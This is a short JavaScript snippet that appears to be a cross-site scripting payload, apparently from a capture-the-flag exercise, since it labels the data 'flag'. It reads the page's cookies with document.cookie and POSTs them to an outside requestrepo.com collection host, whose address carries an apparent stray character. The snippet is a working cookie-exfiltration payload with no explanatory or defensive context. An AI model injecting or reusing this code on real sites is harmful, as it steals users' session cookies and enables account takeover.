var cookieValue = document.cookie;
fetch("https://pkixhzze.requestrepo.comS", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "flag=" + encodeURIComponent(cookieValue)
}).catch(console.error);